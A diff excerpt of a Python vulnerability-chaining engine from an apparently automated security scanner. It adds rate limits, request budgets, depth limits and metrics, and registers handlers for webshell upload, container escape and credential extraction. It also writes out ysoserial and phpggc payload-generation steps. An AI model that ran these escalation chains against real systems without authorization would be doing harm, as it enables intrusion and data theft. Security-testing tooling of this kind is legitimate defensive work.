+            "chains_executed": 0,
+            "chains_successful": 0,
+            "chains_failed": 0,
+            "chains_skipped_budget": 0,
+            "chains_skipped_depth": 0,
+            "total_chain_findings": 0,
+            "escalations_attempted": 0,
+            "requests_made": 0,
+            "execution_time_total": 0.0,
+            "by_trigger": {},
+            "by_action": {},
+        }
+        logger.debug("[CHAIN_ENGINE] State reset for new scan")
+
+    def set_rate_limiter(self, rate_limiter: RateLimiter) -> None:
+        """
+        C1 FIX: Set rate limiter for chain handlers.
+
+        Args:
+            rate_limiter: RateLimiter instance from scanner
+        """
+        self._rate_limiter = rate_limiter
+        logger.debug("[CHAIN_ENGINE] Rate limiter configured")
+
+    def set_shared_store(self, store: SharedFindingsStore) -> None:
+        """
+        C3 FIX: Set SharedFindingsStore for cross-module sharing.
+
+        Args:
+            store: SharedFindingsStore instance
+        """
+        self._shared_store = store
+        logger.debug("[CHAIN_ENGINE] SharedFindingsStore configured")
+
+    async def _acquire_rate_limit(self) -> bool:
+        """
+        C1 FIX: Acquire rate limit before making HTTP request.
+
+        Returns:
+            True if request allowed, False if budget exhausted
+        """
+        # Check budget first (C2 FIX)
+        max_requests = CHAIN_LIMITS.get("max_requests_per_chain", 10)
+        if self._current_chain_requests >= max_requests:
+            logger.info(
+                f"[AUDIT][CHAIN] Budget exhausted for '{self._current_chain_action}' "
+                f"({self._current_chain_requests}/{max_requests} requests)"
+            )
+            return False
+
+        # Then acquire rate limit (C1 FIX)
+        if self._rate_limiter:
+            try:
+                await self._rate_limiter.acquire()
+            except Exception as e:
+                logger.warning(f"[CHAIN_ENGINE] Rate limiter error: {e}")
+                return False
+
+        self._current_chain_requests += 1
+        return True
+
+    def _get_chain_budget_remaining(self) -> int:
+        """
+        C2 FIX: Get remaining request budget for current chain.
+
+        Returns:
+            Number of requests remaining
+        """
+        max_requests = CHAIN_LIMITS.get("max_requests_per_chain", 10)
+        return max(0, max_requests - self._current_chain_requests)
 
     def _load_action_handlers(self) -> None:
         """Load action handlers from chain_actions modules."""
@@ -949,6 +1599,54 @@ class VulnerabilityChainEngine:
             "comms_verify_abuse_chain": self._comms_verify_abuse_chain,
             "comms_auth_bypass_chain": self._comms_auth_bypass_chain,
             "speculative_comms_attack_paths": self._speculative_comms_attack_paths,
+
+            # ════════════════════════════════════════════════════════════════
+            # ORPHAN TRIGGER HANDLERS (previously missing)
+            # ════════════════════════════════════════════════════════════════
+            "path_traversal_config_extraction": self._path_traversal_config_extraction,
+            "path_traversal_source_code": self._path_traversal_source_code,
+            "weak_crypto_token_forge": self._weak_crypto_token_forge,
+            "session_fixation_ato": self._session_fixation_ato,
+            "rfi_remote_shell": self._rfi_remote_shell,
+            "rfi_data_exfiltration": self._rfi_data_exfiltration,
+            "sqli_blind_data_extraction": self._sqli_blind_data_extraction,
+            "sqli_blind_file_read": self._sqli_blind_file_read,
+            "s3_data_enumeration": self._s3_data_enumeration,
+            "s3_write_check": self._s3_write_check,
+
+            # ════════════════════════════════════════════════════════════════
+            # H2 FIX 2026-02-12: ORPHAN TRIGGER HANDLERS
+            # ════════════════════════════════════════════════════════════════
+            # CSRF handlers
+            "csrf_admin_action": self._csrf_admin_action,
+            "csrf_account_takeover": self._csrf_account_takeover,
+            # HTTP Smuggling handlers
+            "smuggling_cache_poison": self._smuggling_cache_poison,
+            "smuggling_request_hijack": self._smuggling_request_hijack,
+            # Container handlers
+            "container_escape": self._container_escape,
+            "container_secret_extraction": self._container_secret_extraction,
+            # File Upload handlers
+            "upload_webshell": self._upload_webshell,
+            "upload_xss": self._upload_xss,
+            # Git handlers
+            "git_credential_extraction": self._git_credential_extraction,
+            "git_source_analysis": self._git_source_analysis,
+            # CI/CD handlers
+            "cicd_pipeline_injection": self._cicd_pipeline_injection,
+            "cicd_secret_extraction": self._cicd_secret_extraction,
+            # Subdomain Takeover handlers
+            "takeover_cookie_theft": self._takeover_cookie_theft,
+            "takeover_phishing": self._takeover_phishing,
+            # Prototype Pollution handlers
+            "pp_xss_escalation": self._pp_xss_escalation,
+            "pp_auth_bypass": self._pp_auth_bypass,
+            # WebSocket handlers
+            "ws_session_hijack": self._ws_session_hijack,
+            "ws_data_injection": self._ws_data_injection,
+            # Padding Oracle handlers
+            "oracle_token_forge": self._oracle_token_forge,
+            "oracle_decrypt": self._oracle_decrypt,
         }
 
     def set_context(self, **kwargs) -> None:
@@ -959,16 +1657,29 @@ class VulnerabilityChainEngine:
         """Get current context."""
         return self.context.copy()
 
-    async def process_finding(self, finding: Dict[str, Any]) -> List[Dict[str, Any]]:
+    async def process_finding(
+        self, finding: Dict[str, Any], depth: int = 0
+    ) -> List[Dict[str, Any]]:
         """
         Process a finding and execute applicable chains.
 
         Args:
             finding: A vulnerability finding dict
+            depth: M4 FIX - Current chain depth (prevents infinite recursion)
 
         Returns:
             List of new findings from chain execution
         """
+        # M4 FIX 2026-02-12: Check chain depth limit
+        if depth >= self.max_chain_depth:
+            self._metrics["chains_skipped_depth"] += 1
+            logger.debug(f"[CHAIN_ENGINE] Max depth {self.max_chain_depth} reached, skipping chain")
+            return []
+
+        # M5 FIX: Track metrics
+        self._metrics["findings_processed"] += 1
+        self._current_depth = depth
+
         # Generate finding ID to avoid reprocessing
         finding_id = self._generate_finding_id(finding)
         if finding_id in self.findings_processed:
@@ -983,31 +1694,313 @@ class VulnerabilityChainEngine:
             logger.debug(f"No chain trigger for finding type: {finding.get('type')}")
             return []
 
+        # M5 FIX: Track by trigger type
+        trigger_name = trigger.name
+        self._metrics["by_trigger"][trigger_name] = self._metrics["by_trigger"].get(trigger_name, 0) + 1
+
         # Update context from finding
         self._update_context_from_finding(finding)
+
+        # Check if proof engine already analyzed this finding
+        proof_data = (finding.get("metadata") or {}).get("proof", {})
+        has_proof = bool(proof_data)
+        proof_can_chain = proof_data.get("can_chain", False) if has_proof else False
 
         # Find applicable rules
         applicable_rules = self._get_applicable_rules(trigger)
         if not applicable_rules:
-            logger.debug(f"No applicable chain rules for trigger: {trigger}")
+            # If no rules but proof suggests chaining, log it for visibility
+            if proof_can_chain:
+                logger.info(f"[CHAIN_ENGINE] Proof suggests chain for {trigger.name} but no matching rules")
+            else:
+                logger.debug(f"No applicable chain rules for trigger: {trigger}")
             return []
 
-        logger.info(f"🔗 Chain Engine: {len(applicable_rules)} rules triggered by {trigger.name}")
+        # Log with proof awareness
+        proof_indicator = " (PROOF-GUIDED)" if proof_can_chain else ""
+        depth_indicator = f" [depth={depth}]" if depth > 0 else ""
+        logger.info(f"🔗 Chain Engine: {len(applicable_rules)} rules triggered by {trigger.name}{proof_indicator}{depth_indicator}")
 
         # Execute chains in priority order
+        # H4 FIX 2026-02-12: Include endpoint in dedup key to allow same chain
+        # on different endpoints (e.g., SQLi RCE on /api/users AND /api/orders)
         all_chain_findings = []
+        endpoint = finding.get("matched_at") or finding.get("metadata", {}).get("url", "")
         for rule in sorted(applicable_rules, key=lambda r: r.priority.value, reverse=True):
+            # H4 FIX: Dedup key includes endpoint, not just action name
+            chain_dedup_key = f"{rule.action}:{endpoint}"
+            if chain_dedup_key in self._chain_actions_completed:
+                logger.debug(f"  ⊘ Chain '{rule.action}' already completed for {endpoint}, skipping")
+                continue
+
             try:
+                # M5 FIX: Track execution
+                self._metrics["chains_executed"] += 1
+                self._metrics["by_action"][rule.action] = self._metrics["by_action"].get(rule.action, 0) + 1
+
                 result = await self._execute_chain(rule, finding)
                 self.chain_results.append(result)
 
+                # M5 FIX: Track time
+                self._metrics["execution_time_total"] += result.execution_time
+
                 if result.success and result.findings:
                     logger.info(f"  ✓ Chain '{rule.action}' found {len(result.findings)} new findings")
+                    # H1 FIX 2026-02-12: Standardize finding structure (url, module_name, cwe)
+                    for cf in result.findings:
+                        self._standardize_chain_finding(cf, finding, rule.action)
                     all_chain_findings.extend(result.findings)
+                    # H4 FIX: Use endpoint-aware dedup key
+                    self._chain_actions_completed.add(chain_dedup_key)
+                    # M5 FIX: Track success
+                    self._metrics["chains_successful"] += 1
+                    self._metrics["total_chain_findings"] += len(result.findings)
+                else:
+                    self._metrics["chains_failed"] += 1
             except Exception as e:
                 logger.warning(f"  ✗ Chain '{rule.action}' failed: {e}")
+                self._metrics["chains_failed"] += 1
+
+        # C3 FIX 2026-02-12: Share chain findings to SharedFindingsStore
+        # This enables other modules to see and build upon chain discoveries
+        self._share_chain_findings(all_chain_findings)
+
+        # M4 FIX: Process chain findings recursively (with incremented depth)
+        # This allows chains to trigger other chains (e.g., SQLi → Creds → Admin Access)
+        if all_chain_findings and depth < self.max_chain_depth - 1:
+            for chain_finding in all_chain_findings:
+                sub_findings = await self.process_finding(chain_finding, depth + 1)
+                all_chain_findings.extend(sub_findings)
 
         return all_chain_findings
+
+    def get_metrics(self) -> Dict[str, Any]:
+        """
+        M5 FIX: Get chain execution metrics for reporting.
+
+        Returns:
+            Dictionary with comprehensive chain metrics
+        """
+        return {
+            **self._metrics,
+            # Add computed metrics
+            "success_rate": (
+                self._metrics["chains_successful"] / max(1, self._metrics["chains_executed"])
+            ) * 100,
+            "avg_execution_time": (
+                self._metrics["execution_time_total"] / max(1, self._metrics["chains_executed"])
+            ),
+            "unique_triggers": len(self._metrics["by_trigger"]),
+            "unique_actions": len(self._metrics["by_action"]),
+            # Top performers
+            "top_triggers": sorted(
+                self._metrics["by_trigger"].items(),
+                key=lambda x: x[1],
+                reverse=True
+            )[:5],
+            "top_actions": sorted(
+                self._metrics["by_action"].items(),
+                key=lambda x: x[1],
+                reverse=True
+            )[:5],
+        }
+
+    def _share_chain_findings(self, chain_findings: List[Dict[str, Any]]) -> None:
+        """
+        C3 FIX: Share chain findings to SharedFindingsStore.
+
+        This enables cross-module awareness:
+        - Session scanner can see SQLi credential extraction → test stolen creds
+        - XSS scanner can see CORS misconfiguration → build ATO chain
+        - Business logic scanner can see IDOR findings → test financial impact
+        """
+        if not chain_findings:
+            return
+
+        # Get shared store (use instance or global)
+        store = self._shared_store or get_shared_findings()
+        if not store:
+            logger.debug("[CHAIN_ENGINE] No SharedFindingsStore available")
+            return
+
+        shared_count = 0
+        for cf in chain_findings:
+            try:
+                # Map chain type to VulnType
+                vuln_type_str = cf.get("type", "chain_finding")
+                vuln_type = self._map_chain_to_vuln_type(vuln_type_str)
+
+                store.add_finding(
+                    vuln_type=vuln_type,
+                    finding=cf,
+                    module_name="vuln_chain_engine"
+                )
+                shared_count += 1
+            except Exception as e:
+                logger.debug(f"[CHAIN_ENGINE] Failed to share finding: {e}")
+
+        if shared_count > 0:
+            logger.info(f"[AUDIT][CHAIN] Shared {shared_count} chain findings to store")
+
+    def _map_chain_to_vuln_type(self, chain_type: str) -> VulnType:
+        """Map chain finding type to SharedFindingsStore VulnType."""
+        chain_type_lower = chain_type.lower()
+
+        # Direct mappings (use correct enum names from shared_findings_store.py)
+        if "sqli" in chain_type_lower or "sql" in chain_type_lower:
+            return VulnType.SQL_INJECTION
+        if "xss" in chain_type_lower:
+            return VulnType.XSS
+        if "lfi" in chain_type_lower or "file_read" in chain_type_lower:
+            return VulnType.LFI
+        if "ssrf" in chain_type_lower:
+            return VulnType.SSRF
+        if "xxe" in chain_type_lower:
+            return VulnType.XXE
+        if "ssti" in chain_type_lower:
+            return VulnType.SSTI
+        if "cmdi" in chain_type_lower or "rce" in chain_type_lower or "command" in chain_type_lower:
+            return VulnType.COMMAND_INJECTION
+        if "idor" in chain_type_lower or "access" in chain_type_lower:
+            return VulnType.IDOR
+        if "auth" in chain_type_lower or "credential" in chain_type_lower:
+            return VulnType.AUTH_BYPASS
+        if "session" in chain_type_lower:
+            return VulnType.SESSION_ABUSE
+        if "cors" in chain_type_lower:
+            return VulnType.CORS
+        if "csrf" in chain_type_lower:
+            return VulnType.CSRF
+        if "business" in chain_type_lower:
+            return VulnType.BUSINESS_LOGIC
+        if "deser" in chain_type_lower:
+            return VulnType.DESERIALIZATION
+        if "nosql" in chain_type_lower:
+            return VulnType.NOSQL_INJECTION
+        if "smuggl" in chain_type_lower:
+            return VulnType.HTTP_SMUGGLING
+        if "cache" in chain_type_lower:
+            return VulnType.CACHE_POISONING
+        if "redirect" in chain_type_lower:
+            return VulnType.OPEN_REDIRECT
+        if "aws" in chain_type_lower or "s3" in chain_type_lower or "cloud" in chain_type_lower:
+            return VulnType.CLOUD_MISCONFIGURATION
+
+        # Default to OTHER for unknown types
+        return VulnType.OTHER
+
+    def _standardize_chain_finding(
+        self,
+        chain_finding: Dict[str, Any],
+        source_finding: Dict[str, Any],
+        action: str
+    ) -> None:
+        """
+        H1 FIX 2026-02-12: Standardize chain finding structure.
+
+        Ensures all chain findings have:
+        - module_name: "vuln_chain_engine"
+        - url: derived from matched_at or source finding
+        - cwe: mapped from chain type
+        - metadata.is_chain: True
+        - metadata.source_finding: type of triggering finding
+        """
+        # 1. Module name (required for report generation)
+        if "module_name" not in chain_finding:
+            chain_finding["module_name"] = "vuln_chain_engine"
+
+        # 2. URL field (some handlers forget to set it)
+        if "url" not in chain_finding or not chain_finding["url"]:
+            chain_finding["url"] = (
+                chain_finding.get("matched_at") or
+                source_finding.get("matched_at") or
+                source_finding.get("endpoint") or
+                source_finding.get("host") or
+                source_finding.get("metadata", {}).get("url", "")
+            )
+
+        # 3. CWE reference (required for compliance reporting)
+        if "cwe" not in chain_finding or not chain_finding["cwe"]:
+            chain_finding["cwe"] = self._get_cwe_for_chain_type(
+                chain_finding.get("type", ""),
+                chain_finding.get("metadata", {}).get("chain_type", "")
+            )
+
+        # 4. Metadata standardization
+        chain_finding.setdefault("metadata", {})
+        chain_finding["metadata"]["is_chain"] = True
+        chain_finding["metadata"]["source_finding"] = (
+            source_finding.get("vuln_type")
+            or source_finding.get("type", "unknown")
+        )
+        chain_finding["metadata"]["chain_action"] = action
+
+        # 5. vuln_type: infer from chain type so reports don't show "other"
+        if "vuln_type" not in chain_finding or not chain_finding["vuln_type"]:
+            chain_type_str = (
+                chain_finding.get("type", "")
+                + " "
+                + chain_finding.get("metadata", {}).get("chain_type", "")
+                + " "
+                + action
+            )
+            chain_finding["vuln_type"] = self._infer_vuln_type(chain_type_str).value
+
+        # 6. Ensure matched_at is set
+        if "matched_at" not in chain_finding or not chain_finding["matched_at"]:
+            chain_finding["matched_at"] = chain_finding.get("url", "")
+
+    def _get_cwe_for_chain_type(self, finding_type: str, chain_type: str) -> str:
+        """
+        H1 FIX: Map chain types to CWE references.
+
+        Returns appropriate CWE-ID for the chain finding.
+        """
+        type_lower = (finding_type + chain_type).lower()
+
+        # CWE mappings for chain findings
+        CWE_MAP = {
+            "sqli": "CWE-89",
+            "sql": "CWE-89",
+            "xss": "CWE-79",
+            "lfi": "CWE-98",
+            "rfi": "CWE-98",
+            "ssrf": "CWE-918",
+            "xxe": "CWE-611",
+            "ssti": "CWE-1336",
+            "cmdi": "CWE-78",
+            "rce": "CWE-94",
+            "command": "CWE-78",
+            "idor": "CWE-639",
+            "auth": "CWE-287",
+            "credential": "CWE-522",
+            "session": "CWE-384",
+            "csrf": "CWE-352",
+            "cors": "CWE-346",
+            "redirect": "CWE-601",
+            "deser": "CWE-502",
+            "smuggl": "CWE-444",
+            "cache": "CWE-525",
+            "upload": "CWE-434",
+            "git": "CWE-200",
+            "cicd": "CWE-94",
+            "container": "CWE-250",
+            "takeover": "CWE-384",
+            "prototype": "CWE-1321",
+            "websocket": "CWE-1385",
+            "oracle": "CWE-354",
+            "nosql": "CWE-943",
+            "business": "CWE-840",
+            "aws": "CWE-200",
+            "s3": "CWE-200",
+            "cloud": "CWE-200",
+        }
+
+        for key, cwe in CWE_MAP.items():
+            if key in type_lower:
+                return cwe
+
+        return "CWE-693"  # Default: Protection Mechanism Failure
 
     def _generate_finding_id(self, finding: Dict[str, Any]) -> str:
         """Generate unique ID for a finding."""
@@ -1017,7 +2010,8 @@ class VulnerabilityChainEngine:
 
     def _finding_to_trigger(self, finding: Dict[str, Any]) -> Optional[ChainTrigger]:
         """Map finding type to chain trigger."""
-        vuln_type = finding.get("type", "").lower().replace(" ", "_").replace("-", "_")
+        raw = finding.get("vuln_type") or finding.get("type", "")
+        vuln_type = raw.lower().replace(" ", "_").replace("-", "_")
         return self.VULN_TYPE_MAPPING.get(vuln_type)
 
     def _update_context_from_finding(self, finding: Dict[str, Any]) -> None:
@@ -1026,8 +2020,11 @@ class VulnerabilityChainEngine:
         evidence_str = str(finding.get("evidence", "")).lower()
 
         # Extract database type from error messages or metadata
+        # SQLi scanner stores as "database_type", chain engine uses "db_type"
         if metadata.get("db_type"):
             self.context["db_type"] = metadata["db_type"]
+        elif metadata.get("database_type") and metadata["database_type"] != "Unknown":
+            self.context["db_type"] = metadata["database_type"]
         elif "error" in evidence_str:
             evidence = str(finding.get("evidence", ""))
             if "mysql" in evidence.lower():
@@ -1045,9 +2042,31 @@ class VulnerabilityChainEngine:
         if metadata.get("poc", {}).get("working_payload"):
             self.context["working_payload"] = metadata["poc"]["working_payload"]
 
-        # Extract vulnerable endpoint
-        if finding.get("matched_at"):
-            self.context["vulnerable_endpoint"] = finding["matched_at"]
+        # Extract vulnerable endpoint from finding fields
+        # Finding.to_dict() uses "endpoint" and "host", legacy uses "matched_at"
+        endpoint = (
+            finding.get("matched_at")
+            or finding.get("endpoint")
+            or finding.get("host")
+            or metadata.get("url", "")
+        )
+        if endpoint:
+            self.context["vulnerable_endpoint"] = endpoint
+
+        # Extract parameter name (common in injection findings)
+        param_name = metadata.get("parameter") or metadata.get("param", "")
+        if param_name:
+            self.context["vulnerable_parameter"] = param_name
+
+        # HTTP evidence (CORS, XSS, etc. store full request/response)
+        http_evidence = metadata.get("http_evidence", {})
+        if http_evidence:
+            self.context["http_evidence"] = http_evidence
+
+        # Detection method (creative_exploiter, etc.)
+        detection_method = metadata.get("detection_method", "")
+        if detection_method:
+            self.context["detection_method"] = detection_method
 
         # Extract any disclosed software versions
         if metadata.get("version"):
@@ -1070,9 +2089,9 @@ class VulnerabilityChainEngine:
                         self.context["credential_data"] = rows
                         break
 
-        # NoSQL extracted data
-        nosql_data = metadata.get("nosql_extracted_data", extracted_data)
-        if nosql_data and finding.get("type", "").lower() in ("nosql_injection", "nosqli"):
+        # NoSQL extracted data - store if present, type check done below with canonical_type
+        nosql_data = metadata.get("nosql_extracted_data")
+        if nosql_data:
             self.context["nosql_extracted_data"] = nosql_data
 
         # XXE file content
@@ -1091,24 +2110,27 @@ class VulnerabilityChainEngine:
             self.context["ssti_rce_output"] = rce_output
             self.context["ssti_has_rce"] = metadata.get("rce_confirmed", False)
 
-        # XSS endpoint for cross-referencing
-        vuln_type = finding.get("type", "").lower()
-        if vuln_type in ("xss", "cross_site_scripting", "dom_xss", "reflected_xss", "stored_xss"):
+        # Normalize the vulnerability type for consistent matching
+        raw_type = finding.get("type", "")
+        canonical_type = normalize_vuln_type(raw_type)
+
+        # XSS endpoint for cross-referencing (xss or dom_xss canonical types)
+        if canonical_type in ("xss", "dom_xss"):
             xss_endpoints = self.context.get("xss_endpoints", [])
             xss_endpoints.append({
                 "url": finding.get("matched_at", ""),
-                "type": vuln_type,
+                "type": canonical_type,
                 "payload": metadata.get("poc", {}).get("working_payload", ""),
             })
             self.context["xss_endpoints"] = xss_endpoints
 
-        # Session/JWT weakness data
-        if vuln_type in ("session_abuse", "jwt_replay", "token_not_invalidated"):
-            self.context["session_weakness_type"] = finding.get("name", vuln_type)
+        # Session/JWT weakness data (session canonical type)
+        if canonical_type == "session":
+            self.context["session_weakness_type"] = finding.get("name", raw_type)
             self.context["has_session_weakness"] = True
 
         # Business logic data
-        if vuln_type == "business_logic":
+        if canonical_type == "business_logic":
             biz_findings = self.context.get("business_logic_findings", [])
             biz_findings.append({
                 "name": finding.get("name", ""),
@@ -1116,6 +2138,92 @@ class VulnerabilityChainEngine:
                 "severity": finding.get("severity", ""),
             })
             self.context["business_logic_findings"] = biz_findings
+
+        # SQLi data for credential extraction chains
+        if canonical_type in ("sqli", "sqli_blind"):
+            self.context["has_sqli"] = True
+            if extracted_data:
+                self.context["sqli_endpoints"] = self.context.get("sqli_endpoints", [])
+                self.context["sqli_endpoints"].append(finding.get("matched_at", ""))
+
+        # NoSQL injection for auth bypass chains
+        if canonical_type == "nosqli":
+            self.context["has_nosqli"] = True
+            # Use nosql_extracted_data if present, else fall back to extracted_data
+            if not self.context.get("nosql_extracted_data") and extracted_data:
+                self.context["nosql_extracted_data"] = extracted_data
+
+        # IDOR for data enumeration chains
+        if canonical_type == "idor":
+            idor_endpoints = self.context.get("idor_endpoints", [])
+            idor_endpoints.append({
+                "url": finding.get("matched_at", ""),
+                "name": finding.get("name", ""),
+            })
+            self.context["idor_endpoints"] = idor_endpoints
+
+        # CORS for cross-origin attack chains
+        if canonical_type == "cors":
+            self.context["has_cors_vuln"] = True
+            self.context["cors_endpoint"] = finding.get("matched_at", "")
+
+        # SSRF for internal access chains
+        if canonical_type == "ssrf":
+            self.context["has_ssrf"] = True
+            ssrf_endpoints = self.context.get("ssrf_endpoints", [])
+            ssrf_endpoints.append({
+                "url": finding.get("matched_at", ""),
+                "internal_target": metadata.get("internal_target", ""),
+            })
+            self.context["ssrf_endpoints"] = ssrf_endpoints
+            # Check if cloud metadata was accessed
+            if any(kw in str(metadata).lower() for kw in ["169.254", "metadata", "iam"]):
+                self.context["ssrf_cloud_metadata"] = True
+
+        # LFI for file read chains
+        if canonical_type == "lfi":
+            self.context["has_lfi"] = True
+            lfi_endpoints = self.context.get("lfi_endpoints", [])
+            lfi_endpoints.append({
+                "url": finding.get("matched_at", ""),
+                "file_read": metadata.get("file_content", "")[:200] if metadata.get("file_content") else "",
+            })
+            self.context["lfi_endpoints"] = lfi_endpoints
+
+        # CMDI for RCE chains
+        if canonical_type == "cmdi":
+            self.context["has_cmdi"] = True
+            self.context["cmdi_endpoint"] = finding.get("matched_at", "")
+            if metadata.get("os_type"):
+                self.context["target_os"] = metadata["os_type"]
+
+        # ═══════════════════════════════════════════════════════════════════
+        # PROOF ENGINE INTEGRATION
+        # Extract proof data to inform chain decisions
+        # ═══════════════════════════════════════════════════════════════════
+        proof_data = metadata.get("proof", {})
+        if proof_data:
+            # Track that this finding has been proven
+            if proof_data.get("can_chain"):
+                self.context["proof_suggests_chain"] = True
+                # Store chain targets suggested by proof engine
+                proof_targets = proof_data.get("chain_targets", [])
+                existing_targets = self.context.get("proof_chain_targets", [])
+                existing_targets.extend(proof_targets)
+                self.context["proof_chain_targets"] = existing_targets
+                logger.debug(f"[CHAIN_ENGINE] Proof suggests chains: {proof_targets}")
+
+            if proof_data.get("can_escalate"):
+                self.context["proof_suggests_escalation"] = True
+                self.context["escalation_type"] = proof_data.get("escalation", "")
+
+            if proof_data.get("can_mutate"):
+                self.context["proof_confirms_exploitable"] = True
+
+            # Store proven impact for severity boosting
+            proven_impact = proof_data.get("proven_impact", "")
+            if proven_impact and proven_impact != "Unproven":
+                self.context["proven_impact"] = proven_impact
 
     def _get_applicable_rules(self, trigger: ChainTrigger) -> List[ChainRule]:
         """Get rules applicable for a trigger given current context."""
@@ -1150,6 +2258,19 @@ class VulnerabilityChainEngine:
         import time
         start_time = time.time()
 
+        # Track escalation attempts for metrics
+        self.escalations_attempted += 1
+
+        # C2 FIX 2026-02-12: Initialize budget tracking for this chain
+        self._current_chain_action = rule.action
+        self._current_chain_requests = 0
+        max_requests = CHAIN_LIMITS.get("max_requests_per_chain", 10)
+
+        # Check if active testing is even allowed
+        if not is_chain_testing_allowed() and max_requests > 0:
+            logger.debug(f"[CHAIN] Active testing disabled, skipping '{rule.action}'")
+            # Return speculative findings only (handlers should check this too)
+
         handler = self._action_handlers.get(rule.action)
         if not handler:
             return ChainResult(
@@ -1167,30 +2288,84 @@ class VulnerabilityChainEngine:
                 timeout=rule.timeout
             )
 
+            # Log budget usage for audit
+            if self._current_chain_requests > 0:
+                logger.info(
+                    f"[AUDIT][CHAIN] '{rule.action}' used "
+                    f"{self._current_chain_requests}/{max_requests} requests"
+                )
+
             return ChainResult(
                 success=True,
                 action=rule.action,
                 findings=findings,
-                evidence={"trigger_finding": finding},
+                evidence={
+                    "trigger_finding": finding,
+                    "requests_made": self._current_chain_requests,  # C2 FIX: Track usage
+                },
                 execution_time=time.time() - start_time,
+                error_type=ChainErrorType.NONE,
+                retryable=False,
             )
         except asyncio.TimeoutError:
+            # H6 FIX: Timeout is retryable with longer timeout
             return ChainResult(
                 success=False,
                 action=rule.action,
                 findings=[],
-                evidence={},
+                evidence={"requests_made": self._current_chain_requests},
                 error=f"Timeout after {rule.timeout}s",
                 execution_time=rule.timeout,
+                error_type=ChainErrorType.TIMEOUT,
+                retryable=True,
             )
-        except Exception as e:
+        except httpx.ConnectError as e:
+            # H6 FIX: Connection error is retryable after backoff
             return ChainResult(
                 success=False,
                 action=rule.action,
                 findings=[],
-                evidence={},
+                evidence={"requests_made": self._current_chain_requests},
+                error=f"Connection error: {e}",
+                execution_time=time.time() - start_time,
+                error_type=ChainErrorType.CONNECTION,
+                retryable=True,
+            )
+        except httpx.HTTPStatusError as e:
+            # H6 FIX: Check if rate limited (429) - retryable
+            error_type = ChainErrorType.RATE_LIMITED if e.response.status_code == 429 else ChainErrorType.HANDLER_ERROR
+            retryable = e.response.status_code == 429
+            return ChainResult(
+                success=False,
+                action=rule.action,
+                findings=[],
+                evidence={"requests_made": self._current_chain_requests, "status_code": e.response.status_code},
+                error=f"HTTP {e.response.status_code}: {e}",
+                execution_time=time.time() - start_time,
+                error_type=error_type,
+                retryable=retryable,
+            )
+        except Exception as e:
+            # H6 FIX: Classify unknown errors
+            error_str = str(e).lower()
+            if "rate limit" in error_str or "too many requests" in error_str:
+                error_type = ChainErrorType.RATE_LIMITED
+                retryable = True
+            elif "budget" in error_str or "exhausted" in error_str:
+                error_type = ChainErrorType.BUDGET_EXHAUSTED
+                retryable = False
+            else:
+                error_type = ChainErrorType.UNKNOWN
+                retryable = False  # Unknown errors not retried by default
+            return ChainResult(
+                success=False,
+                action=rule.action,
+                findings=[],
+                evidence={"requests_made": self._current_chain_requests},
                 error=str(e),
                 execution_time=time.time() - start_time,
+                error_type=error_type,
+                retryable=retryable,
             )
 
     # ============================================
@@ -1750,81 +2925,231 @@ class VulnerabilityChainEngine:
             },
         }]
 
-    # Placeholder implementations for remaining handlers
+    # L1-L4 FIX 2026-02-12: Improved placeholder handlers with proper structure
+    # All handlers now include: url, module_name, cwe, description, detailed PoC
+
     async def _deser_java_gadget(self, finding: Dict, context: Dict) -> List[Dict]:
+        """L1 FIX: Java deserialization → RCE via ysoserial gadgets."""
+        # L5 FIX: Standardized endpoint extraction
+        endpoint = finding.get("matched_at") or context.get("target")
         return [{
             "type": "deser_java_chain",
             "name": "Java Deserialization → ysoserial RCE",
             "severity": "CRITICAL",
-            "confidence": 90,
-            "matched_at": context.get("vulnerable_endpoint"),
-            "metadata": {"chain_type": "java_deser_rce", "poc": {"tool": "ysoserial"}},
+            "confidence": get_chain_confidence(vuln_confirmed=True, chain_verified=False),
+            "matched_at": endpoint,
+            "url": endpoint,
+            "module_name": "vuln_chain_engine",
+            "cwe": "CWE-502",
+            "description": "Java deserialization vulnerability can be escalated to RCE using ysoserial gadget chains",
+            "metadata": {
+                "chain_type": "java_deser_rce",
+                "is_chain": True,
+                "poc": {
+                    "tool": "ysoserial",
+                    "steps": [
+                        "1. Identify serialization endpoint (Content-Type: application/x-java-serialized-object)",
+                        "2. Fingerprint available libraries: CommonsCollections, Spring, etc.",
+                        "3. Generate payload: java -jar ysoserial.jar CommonsCollections5 'id'",
+                        "4. Send serialized payload to vulnerable endpoint",
+                        "5. Verify RCE via DNS/HTTP callback",
+                    ],
+                    "common_gadgets": ["CommonsCollections1-7", "Spring1-4", "JRMPClient", "Hibernate1-2"],
+                },
+            },
         }]
 
     async def _deser_php_gadget(self, finding: Dict, context: Dict) -> List[Dict]:
+        """L1 FIX: PHP deserialization → Object injection RCE via PHPGGC."""
+        endpoint = finding.get("matched_at") or context.get("target")
         return [{
             "type": "deser_php_chain",
             "name": "PHP Deserialization → Object Injection RCE",
             "severity": "CRITICAL",
-            "confidence": 90,
-            "matched_at": context.get("vulnerable_endpoint"),
-            "metadata": {"chain_type": "php_deser_rce", "poc": {"tool": "phpggc"}},
+            "confidence": get_chain_confidence(vuln_confirmed=True, chain_verified=False),
+            "matched_at": endpoint,
+            "url": endpoint,
+            "module_name": "vuln_chain_engine",
+            "cwe": "CWE-502",
+            "description": "PHP unserialize() can be exploited for RCE via POP chains using PHPGGC",
+            "metadata": {
+                "chain_type": "php_deser_rce",
+                "is_chain": True,
+                "poc": {
+                    "tool": "phpggc",
+                    "steps": [
+                        "1. Identify unserialize() sink with user-controlled input",
+                        "2. Fingerprint framework: Laravel, Symfony, Magento, etc.",
+                        "3. Generate payload: phpggc Laravel/RCE1 system 'id' -b",
+                        "4. URL/base64 encode if needed",
+                        "5. Inject via vulnerable parameter",
+                    ],
+                    "common_chains": ["Laravel/RCE1-10", "Symfony/RCE1-4", "Monolog/RCE1-3", "Guzzle/RCE1"],
+                },
+            },
         }]
 
     async def _deser_python_pickle(self, finding: Dict, context: Dict) -> List[Dict]:
+        """L1 FIX: Python pickle → RCE via __reduce__."""
+        endpoint = finding.get("matched_at") or context.get("target")
         return [{
             "type": "deser_python_chain",
             "name": "Python Pickle → RCE",
             "severity": "CRITICAL",
-            "confidence": 90,
-            "matched_at": context.get("vulnerable_endpoint"),
-            "metadata": {"chain_type": "python_pickle_rce"},
+            "confidence": get_chain_confidence(vuln_confirmed=True, chain_verified=False),
+            "matched_at": endpoint,
+            "url": endpoint,
+            "module_name": "vuln_chain_engine",
+            "cwe": "CWE-502",
+            "description": "Python pickle.loads() with untrusted data enables RCE via __reduce__",
+            "metadata": {
+                "chain_type": "python_pickle_rce",
